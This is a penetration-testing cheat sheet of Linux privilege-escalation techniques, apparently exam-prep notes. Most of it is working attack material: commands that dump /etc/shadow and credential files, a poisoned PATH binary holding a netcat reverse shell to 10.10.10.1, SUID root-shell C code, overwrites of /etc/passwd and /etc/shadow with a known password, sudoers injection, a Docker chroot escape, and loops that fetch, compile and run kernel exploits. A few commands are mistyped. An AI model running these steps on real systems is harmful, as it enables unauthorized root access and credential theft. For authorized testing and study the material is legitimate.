# Linux

![](<../.gitbook/assets/image (6).png>)

```
Once you've found the patch to escalation click here:
https://github.com/Ignitetechnologies/Privilege-Escalation
```

![](<../.gitbook/assets/image (7).png>)

![](<../.gitbook/assets/image (2).png>)

## Linux Privilege Escalation Examples

```
https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/linux/linux-examples.rst
```

###

## MindMap

![](<../.gitbook/assets/image (5).png>)

### Useful commands to run

```
https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List
```

### Things to look for

* Miss-configured services (cronjobs)
  * any running as a privileged user?
* Incorrect file permissions (exportfs, sudo)
* Miss-configured environment ($PATH)
* Binary with SUID bit
* Software or OS with known vulnerabilities
* Docker usergroup

## SUDO

Read `http://touhidshaikh.com/blog/?p=790`

#### Can you su to root without a password?

```
su root
```

{% hint style="info" %}
If you get an error "su: must be run from a terminal"\
use one of the shell fixes above
{% endhint %}

```
root ALL=(ALL) ALL
The root user can execute from ALL terminals, acting as ALL (any) users, and run ALL (any) command.
```

```
jelly ALL= /sbin/poweroff
The user jelly can from any terminal, run the command power off using jelly's user password.
```

```
jelly ALL = (root) NOPASSWD: /usr/bin/find
The user jelly can from any terminal, run the command find as root user without password.
```

Are you a sudo user already? Do you have access to powerful commands like chown or chmod?

```
sudo su -
```

Are you part of the sudo group, but not in the sudoers file?

```
id # 27(sudo)
pkexec sh
```

What can we run with sudo?

```
sudo -l
```

Try su as all users and the username as password

User bash history

```
cat ~/.bash_history; cat ~/.nano_history; cat ~/.atftp_history; cat ~/.mysql_history; cat ~/.php_history
```

## Spawning root shells

Create a copy of `/bin/bash` or `/bin/sh` can you call it `rootbash` - make sure its owned by the root user. Then use `/bin/bash -p` to run it

## Questions to ask yourself

#### What user with what permissions + where am I?

```
id
pwd
```

#### What usernames could I login as?

```
 grep -vE "nologin|false" /etc/passwd
```

#### What architecture?

```
uname -m
```

#### Whats running on the machine?

```
ps aux
```

look for something(s) that are running which is not standard

#### What files does the user have permission?

```
find / -user $USER
find / -name -*$USER* # looks for files with the username in it
```

#### What services are running?

```
netstat -antup
```

if things are here that are not on the nmap scan - could be a firewall rule blocking it is mysql in there? If so creds will be stored somewhere on the box

#### What is installed?

```
dpkg -l | awk '$1 ~ /ii/{print $2,$3}'
rpm -qa
#copy output over to kali and run /scripts/linux/pkg_lookup.sh to find a vulnerable version or do below
```

#### Run on target

```
FILE="packages.txt"; FILEPATH="/tmp/$FILE"; /usr/bin/rpm -q -f /usr/bin/rpm >/dev/null 2>&1; if [ $? -eq 0 ]; then rpm -qa --qf "%{NAME} %{VERSION}\n" | sort -u > $FILEPATH; echo "kernel $(uname -r)" >> $FILEPATH; else dpkg -l | grep ii | awk '{print $2 " " substr($3,1)}' > $FILEPATH; echo "kernel $(uname -r)" >> $FILEPATH; fi; echo ""; echo "[>] Done. Transfer $FILEPATH to your computer and run: "; echo ""; echo "./packages_compare.sh /path/to/$FILE"; echo "";
```

Copy /tmp/packages.txt which it has created back to your machine and then run

```
#download this
https://raw.githubusercontent.com/rowbot1/burmatscripts/master/bash/vuln_pkg_lookup.sh
```

```
./vuln_pkg_loookup.sh packages.txt
```

```
# Common locations for user installed software
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

# Debian
dpkg -l

# CentOS, OpenSuse, Fedora, RHEL
rpm -qa (CentOS / openSUSE )

# OpenBSD, FreeBSD
pkg_info
```

#### What kernel version - low hanging fruit?

```
uname -a
```

#### What web app creds can i find?

```
find . -iname 'config' 2>/dev/null
```

Research where creds would be stored on certain webapps

#### Can you see the shadow file - get lucky?

```
cat /etc/shadow
```

What services are running as root?:

```
ps aux | grep root
```

Look for vulnerable/privileged components such as: mysql, sudo, udev, python

If **/etc/exports** if writable, you can add an NFS entry or change and existing entry adding the **no\_root\_squash** flag to a root directory, put a binary with SUID bit on, and get root.

### Some programs that can be used to spawn a shell:

```
nmap
vim
less
more
```

## Docker

Are you in a docker usergroup

```
uid=1000($user)gid=1000($user)groups=1000($user),24(cdrom),25(floppy),999(docker)
```

Get the image name `docker ps` then run

```
docker run -v /:/mnt --rm -it $imagenamehere chroot /mnt sh
```

this will then get you a root shell

{% hint style="success" %}
[https://gtfobins.github.io/gtfobins/docker/](https://gtfobins.github.io/gtfobins/docker/)
{% endhint %}

## Cron Jobs

### What jobs are scheduled?

```
crontab -l 2>/dev/null
ls -alh /var/spool/cron 2>/dev/null
ls -al /etc/ | grep cron 2>/dev/null
ls -al /etc/cron* 2>/dev/null
cat /etc/cron* 2>/dev/null
cat /etc/at.allow 2>/dev/null
cat /etc/at.deny 2>/dev/null
cat /etc/cron.allow 2>/dev/null
cat /etc/cron.deny 2>/dev/null
cat /etc/crontab 2>/dev/null
cat /etc/anacrontab 2>/dev/null
cat /var/spool/cron/crontabs/root 2>/dev/null
```

If there is a **cronjob** that runs as run but it has incorrect file permissions, you can change it to run your SUID binary and get a shell.

The following command will list processes running by root, permissions and NFS exports.

```
echo 'services running as root'; ps aux | grep root;  echo 'permissions'; ps aux | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++'; echo 'nfs info'; ls -la /etc/exports 2>/dev/null; cat /etc/exports 2>/dev/null
```

Use netstat to find other machines connected

```
netstat -ano
```

#### Confidential information and users

```
id
su
sudo -l
cat /etc/passwd
cat /etc/shadow
cat /etc/group
cat /etc/sudoers # who is in there are you?
ls -alh /var/mail/
ls -ahlR /root
ls -ahlR /home/
```

```
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 {print $1}' #any other super users?
```

## Find interesting files and directories fast

`find / -name "*.txt" 2> >(grep -v 'Permission denied' >&2)`

`grep -R -i "password" 2> >(grep -v 'Permission denied' >&2)`

### File Write

If you can write to any of these files or directories you have a good chance of PE

```
~/.ssh/authorized_keys
/var/www/html
/var/spool/cron/crontabs/$user
/etc/crontab
/etc/cron.*
$PATH or Libraries(.py)
/etc/systemd/system
/etc/init.d
/etc/sudoers
```

## If you have found a download it to your box and open it in Ghidra. Check the main function to view de-compiled commands interesting binary SUID files / binaries

Things to remember:

* Run strings on the binary. Read all of it, don't just read the bottom of the output - read the top. Look for programs that the binary calls like `curl`. If you spot one then if it doesn't have its full path you can exploit it by modifying the path variable and creating a file with `/bin/bash.` See box symofonos:1.

The file will run as the owner no matter who executes it. So if root owns it, we can run it and hijack it to become root

```
ltrace ./binary
# step through binary may result in revealing password if password is needed to run it
```

## Capabilities

Linux capabilities provide a subset of the available root privileges to a process. This effectively breaks up root privileges into smaller and distinctive units. Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation.

```
https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities
```

| Capabilities name          | Description                                                                                                                                 |
| -------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
| CAP\_AUDIT\_CONTROL        | Allow to enable/disable kernel auditing                                                                                                     |
| CAP\_AUDIT\_WRITE          | Helps to write records to kernel auditing log                                                                                               |
| CAP\_BLOCK\_SUSPEND        | This feature can block system suspends                                                                                                      |
| **CAP\_CHOWN**             | Allow user to make arbitrary change to files UIDs and GIDs (full filesystem access)                                                         |
| **CAP\_DAC\_OVERRIDE**     | This helps to bypass file read, write and execute permission checks (full filesystem access)                                                |
| **CAP\_DAC\_READ\_SEARCH** | This only bypass file and directory read/execute permission checks                                                                          |
| CAP\_FOWNER                | This enables to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file |
| CAP\_KILL                  | Allow the sending of signals to processes belonging to others                                                                               |
| CAP\_SETGID                | Allow changing of the GID                                                                                                                   |
| **CAP\_SETUID**            | Allow changing of the UID (set UID of root in you process)                                                                                  |
| CAP\_SETPCAP               | Helps to transferring and removal of current set to any PID                                                                                 |
| CAP\_IPC\_LOCK             | This helps to lock memory                                                                                                                   |
| CAP\_MAC\_ADMIN            | Allow MAC configuration or state changes                                                                                                    |
| CAP\_NET\_RAW              | Use RAW and PACKET sockets                                                                                                                  |
| CAP\_NET\_BIND\_SERVICE    | SERVICE Bind a socket to internet domain privileged ports                                                                                   |
| CAP\_SYS\_CHROOT           | Ability to call chroot()                                                                                                                    |

## World-writable folders

```
find / -writable -type d 2>/dev/null
```

```
find / -perm -222 -type d 2>/dev/null
```

```
find / -perm -o w -type d 2>/dev/null
```

### World-executable folders

```
find / -perm -o x -type d 2>/dev/null
```

### World-writeable & executable folders

```
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
```

#### gives a bit more info

```
find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root
```

### Word writable directories for root

```
find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep root
```

#### Look for binaries with the SUID or GUID bits set.

```
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \; 2>/dev/null
```

```
find / -perm -1000 -type d 2>/dev/null
```

```
find / -perm -g=s -type f 2>/dev/null
```

```
find / -user root -perm -4000 -print 2>/dev/null
```

In plain English, this command says to find files in the / directory owned by the user root with SUID permission bits (_-perm -4000_), print them, and then redirect all errors (_2_ = stderr) to _/dev/null_ (where they get thrown away). The reason for this redirect is that we aren't interested in things that we can't access, and access denied errors can fill up a terminal pretty fast.

Adding a binary to PATH, to hijack another SUID binary invokes it without the fully qualified path.

```
function /usr/bin/foo () { /usr/bin/echo "It works"; }
export -f /usr/bin/foo
/usr/bin/foo
It works
```

If you can get root to execute anything, the following will change a binary owner to him and set the SUID flag:

```
chown root:root /tmp/setuid;chmod 4777 /tmp/setuid;
```

```
#look for the string password in files in the current directory
grep -rwl "password"
```

### /etc/shadow overwrite

If a SUID binary allows you to write to a file, overwrite **/etc/shadow** with the following then **su** to root using password **rowbot**

```
root:$6$saltsalt$zjiFtiGFBUkyU86/TTUE1Dgg6ZNem6QUdhcVVRsjLXvWGjCm90F/2.PDpGOfGCspP0/j6a6YLlImSqQZIUmqc.:18294:0:99999:7:::
```

### Check running services and installed applications <a href="#check-running-services-and-installed-applications" id="check-running-services-and-installed-applications"></a>

`ps -ef cat /etc/services dpkg -l rpm -qa`

An example here is for instance that you see a local database like mysql is running. Maybe you are able to find credentials for it and log into it locally on the box

If MYSQL is running as root, you can run commands using **sys\_exec()**. For instance, to add user to sudoers:

```
ps -aux | grep root | grep mysql
```

```
sys_exec('usermod -a -G admin username')
```

More about MYSQL:

```
https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/
```

Command to skip ignored lines in config files

```
alias nonempty="egrep -v '^[ \t]*#|^$'"
```

Find Linux distribution & version

```
cat /etc/issue; cat /etc/*-release; cat /etc/lsb-release; cat /etc/redhat-release;
```

Check versions - use in conjunction with searchsploit

```
dpkg -l
rpm -qa
httpd -v
mysql --version
python --version
ruby -v
```

#### Architecture

```
cat /etc/*release
uname -m
```

#### Environment variables

```
cat /etc/profile; cat /etc/bashrc; cat ~/.bash_profile; cat ~/.bashrc; cat ~/.bash_logout; env; set
```

Find printers

```
lpstat -a
```

#### Find apps installed;

```
ls -alh /usr/bin/; ls -alh /sbin/; dpkg -l; rpm -qa; ls -alh /var/cache/apt/archivesO; ls -alh /var/cache/yum/*;
```

#### Find writable configuration files

```
find /etc/ -writable -type f 2>/dev/null
```

#### Miss-configured services

```
cat /etc/syslog.conf; cat /etc/chttp.conf; cat /etc/lighttpd.conf; cat /etc/cups/cupsd.conf; cat /etc/inetd.conf; cat /etc/apache2/apache2.conf; cat /etc/my.conf; cat /etc/httpd/conf/httpd.conf; cat /opt/lampp/etc/httpd.conf; ls -aRl /etc/ | awk '$1 ~ /^.*r.*/'
```

#### Scheduled jobs

```
crontab -l; ls -alh /var/spool/cron; ls -al /etc/ | grep cron; ls -al /etc/cron*; cat /etc/cron*; cat /etc/at.allow; cat /etc/at.deny; cat /etc/cron.allow; cat /etc/cron.deny'
```

{% hint style="info" %}
[https://www.ghacks.net/2009/04/04/get-to-know-linux-the-etcinitd-directory/](https://www.ghacks.net/2009/04/04/get-to-know-linux-the-etcinitd-directory/)
{% endhint %}

#### Grep hardcoded passwords

```
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"
```

#### if web server run in web root:

```
grep "localhost" ./ -R
```

#### Network configuration

```
/sbin/ifconfig -a; cat /etc/network/interfaces; cat /etc/sysconfig/network; cat /etc/resolv.conf; cat /etc/sysconfig/network; cat /etc/networks; iptables -L; hostname; dnsdomainname
```

List other users home directories

```
ls -ahlR /root/; ls -ahlR /home/
```

User mails

```
cat ~/.bashrc; cat ~/.profile; cat /var/mail/root; cat /var/spool/mail/root
```

Find interesting binaries

```
find / -name wget 2>/dev/null; find / -name nc* 2>/dev/null; find / -name netcat* 2>/dev/null; find / -name tftp* 2>/dev/null; find / -name ftp 2>/dev/null
```

#### Mounted filesystems

```
mount; df -h; cat /etc/fstab
```

If you can just change PATH, the following will add a poisoned ssh binary:

```
 set PATH="/tmp:/usr/local/bin:/usr/bin:/bin"
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.1 4444 >/tmp/f" >> /tmp/ssh
 chmod +x ssh
```

```
#Ippsec demoing $PATH PE
https://www.youtube.com/watch?v=3VxZNflJqsw
```

### Generating SUID C Shell for /bin/bash

```
int main() {
    setuid(0);
    system("/bin/bash -p");
}
```

Compile using `gcc -o <name> <filename.c>`

Without interactive shell

```
echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/bash");\n}' > setuid.c
```

If /etc/passwd has incorrect permissions, you can root:

```
echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd; su
or
echo "root:JblITMXA7I1hg:0:0:root:/root:/bin/bash" > /etc/passwd
then su using password rowbot
```

or

```
openssl passwd
#put in password, output is random sting
#pass this on the x part of root in /etc/passwd
su root using the password u set
```

Add user www-data to sudoers without password

```
chmod 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
```

If you can sudo chmod:

```
echo -e '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main(void){\n\tsetuid(0);\n\tsetgid(0);\n\tsystem("/bin/bash");\n}' > setuid.c $ sudo chown root:root /tmp/setuid; sudo chmod 4777 /tmp/setuid; /tmp/setuid
```

Wildcard injection if there is a cron with a wildcard in the command line, you can create a file, whose name will be passed as an argument to the cron task, For more info:

```
https://www.sans.org/reading-room/whitepapers/testing/attack-defend-linux-privilege-escalation-techniques-2016-37562
```

compile exploit fix error

```
gcc 9545.c -o 9545 -Wl,--hash-style=both
```

Find other uses in the system

```
 $id; who; w; last; cat /etc/passwd | cut -d: -f1; echo 'sudoers:'; cat /etc/sudoers; sudo -l
```

```
grep home /etc/passwd|cut -d: -f1
```

#### World readable/writable files:

```
cho "world-writeable folders"; find / -writable -type d 2>/dev/null; echo "world-writeable folders"; find / -perm -222 -type d 2>/dev/null; echo "world-writeable folders"; find / -perm -o w -type d 2>/dev/null; echo "world-executable folders"; find / -perm -o x -type d 2>/dev/null; echo "world-writeable & executable folders"; find / \( -perm -o w -perm -o x \) -type d 2>/dev/null;
```

Find world-readable files:

```
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print
```

Find nobody owned files

```
ind /dir -xdev \( -nouser -o -nogroup \) -print
```

Add user to sudoers in python.

```
#!/usr/bin/env python
import os
import sys
try:
        os.system('echo "username ALL=(ALL:ALL) ALL" >> /etc/sudoers')
except:
        sys.exit()
```

Ring0 kernel exploit for 2.3/2.4

```
wget http://downloads.securityfocus.com/vulnerabilities/exploits/36038-6.c; gcc 36038-6.c -m32 -o ring0; chmod +x ring0; ./ring0
```

#### Inspect web traffic

```
tcpdump tcp port 80 -w output.pcap -i eth0
```

## Scripts to run

### Copy them over

Creates folder `/tmp/rowbot` and copies files on kali web server to target

```
wget -nd -np -R "index.html*" -P /tmp/rowbot --recursive http://kali$ip
```

What is running, any cron jobs any scripts? Use PSPY to find out

```
https://github.com/DominicBreuker/pspy
```

Useful script to run for initial scan - displays info on box

```
wget https://raw.githubusercontent.com/bngr/OSCP-Scripts/master/bangenum.sh
sed -i -e 's/\r$//' bangenum.sh
./bangenum.sh
```

Use this tool first to help you get in the PE mindset.

```
https://github.com/diego-treitos/linux-smart-enumeration
```

### SUID search - good tool

```
https://github.com/Anon-Exploiter/SUID3NUM
https://github.com/TH3xACE/SUDO_KILLER
```

### Automatically downloads and compiles exploit

The following script runs exploit suggester and automatically downloads and executes suggested exploits:

```
wget https://raw.githubusercontent.com/wwong99/pentest-notes/master/scripts/xploit_installer.py
```

```
USAGE: xploit_installer.py <exploit id>
```

### Linux Remote Exploits

```
47: shellshock
48: heartbleed
```

### Kernelpop

automated kernel vulnerability enumeration and exploitation

```
https://github.com/spencerdodd/kernelpop
```

## Linux Local Exploits

```
49: linux-exploit-suggester
50: unix_privesc_check
51: kernel 2.4.x / 2.6.x (sock_sendpage 1)
52: kernel 2.4 / 2.6 (sock_sendpage 2)
53: kernel < 2.6.22 (ftruncate)
54: kernel < 2.6.34 (cap_sys_admin)
55: kernel 2.6.27 < 2.6.36 (compat)
56: kernel < 2.6.36-rc1 (can bcm)
57: kernel <= 2.6.36-rc8 (rds protocol)
58: *kernel < 2.6.36.2 (half nelson)
59: *kernel <= 2.6.37 (full nelson)
60: kernel 2.6 (udev)
61: kernel 3.13 (sgid)
62: kernel 3.13.0 < 3.19 (overlayfs 1)
63: kernel 3.14.5 (libfutex)
64: kernel 2.6.39 <= 3.2.2 (mempodipper)
65: *kernel 2.6.28 / 3.0 (alpha-omega)
66: kernel 2.6.22 < 3.9 (Dirty Cow)
67: kernel 3.7.6 (msr)
68: *kernel < 3.8.9 (perf_swevent_init)
69: kernel <= 4.3.3 (overlayfs 2)
70: kernel 4.3.3 (overlayfs 3)
71: kernel 4.4.0 (af_packet)
72: kernel 4.4.x (double-fdput)
73: kernel 4.4.0-21 (netfilter)
74: *kernel 4.4.1 (refcount)
```

```
wget http://www.securitysift.com/download/linuxprivchecker.py
```

### Linux Kernel Exploits

Check kernel version

```
uname -r : Find Linux kernel version.
cat /proc/version : Show Linux kernel version with help of a special file.
hostnamectl | grep Kernel : For systemd based Linux distro you can use hotnamectl to display hostname and running Linux kernel version.
```

Then do a search for it on this page

```
https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md
```

* Linux Kernel 2.6.39 - 3.2.2 (Gentoo / Ubuntu x86/x64) - 'Mempodipper' Local Privilege Escalation:
  * [https://www.exploit-db.com/exploits/18411/](https://www.exploit-db.com/exploits/18411/)
  * [https://www.securityfocus.com/bid/51625/info](https://www.securityfocus.com/bid/51625/info)
  * CVE-2012-0056
* Linux Kernel 2.6.22 - 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (SUID Method):
  * [https://www.exploit-db.com/exploits/40616/](https://www.exploit-db.com/exploits/40616/)
  * CVE-2016-5195
* Linux Kernel 2.2.x/2.4.x (RedHat) - 'ptrace/kmod' Local Privilege Escalation
  * [https://www.exploit-db.com/exploits/3/](https://www.exploit-db.com/exploits/3/)
  * [http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c](http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c)
  * CVE-2003-0127
* Linux Kernel 2.6 (Debian 4.0 / Ubuntu / Gentoo) UDEV below 1.4.1 - Local Privilege Escalation (1)
  * [https://www.exploit-db.com/exploits/8478/](https://www.exploit-db.com/exploits/8478/)
  * `exploit/linux/local/udev_netlink`

### Unix Priv checker

```
wget https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/upc.sh
```

Other scripts:

```
wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
```

### LinEnum

{% hint style="warning" %}
Remember to run them again if you get a user shell not just www-data shell
{% endhint %}

```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

```
./LinEnum.sh -t -r report.txt
```

### LinuxPrivchecker.py

```
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
```

```
wget https://raw.githubusercontent.com/PenturaLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl
```

```
wget  https://www.rebootuser.com/?p=1758
```

### Exploits worth running

{% hint style="success" %}
Always be sure to read the comments in exploits they inform you about which systems and version are vulnerable, which parts of the script need modification & which compilation flags to use. $targetip 32 bit or 64 bit? Be mindful of this when compiling exploits.
{% endhint %}

#### Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation

```
https://www.exploit-db.com/exploits/37292
```

#### CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8

```
https://www.exploit-db.com/exploits/15285/
```

#### Linux Kernel <= 2.6.37 'Full-Nelson.c'

```
https://www.exploit-db.com/exploits/15704/
```

#### CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)

```
https://git.zx2c4.com/CVE-2012-0056/about/
```

#### Linux CVE 2012-0056

```
wget -O exploit.c <http://www.exploit-db.com/download/18411>
  gcc -o mempodipper exploit.c
  ./mempodipper
```

#### CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8

```
https://dirtycow.ninja/
```

#### Compile dirty cow:

```
 g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
```

#### Cross compiling exploits

```
gcc -m32 -o output32 hello.c #(32 bit)
gcc -m64 -o output hello.c # (64 bit)
```

#### Linux 2.6.32

```
https://www.exploit-db.com/exploits/15285/
```

#### Elevation in 2.6.x:

```
for a in 9352 9513 33321 15774 15150 15944 9543 33322 9545 25288 40838 40616 40611 ; do wget http://yourIP:8000/$a; chmod +x $a; ./$a; id; done
```

### Get proof

```
echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a;echo " ";echo "proof:";cat /root/proof.txt 2>/dev/null; cat /Desktop/proof.txt 2>/dev/null;echo " "
```
